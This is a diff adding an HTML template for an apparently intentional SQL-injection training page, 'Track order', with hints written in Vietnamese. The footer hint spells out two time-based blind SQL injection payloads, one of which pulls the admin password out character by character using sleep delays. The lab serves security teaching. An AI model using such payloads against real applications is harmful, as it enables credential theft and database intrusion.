@@ -1,0 +1,14 @@
+{% extends "base.html" %}
+{% block body %}
+<h2>Track order <span class="tag">time-based blind</span></h2>
+<form method="get" action="/track">
+  <label>code: <input name="code" value="{{ code or '' }}"></label>
+  <button>Tra cuu</button>
+</form>
+{% if done %}
+  <p>Da xu ly ma <code>{{ code }}</code>. (Phan hoi luon giong nhau du dung/sai.)</p>
+{% endif %}
+<p><small>Khong co phan biet TRUE/FALSE tren trang. Dung do tre thoi gian, vi du
+  <code>x' UNION SELECT sleep(3)-- </code> hoac
+  <code>x' UNION SELECT (CASE WHEN substr((SELECT password FROM users WHERE username='admin'),1,1)='S' THEN sleep(3) ELSE 0 END)-- </code>.</small></p>
+{% endblock %}
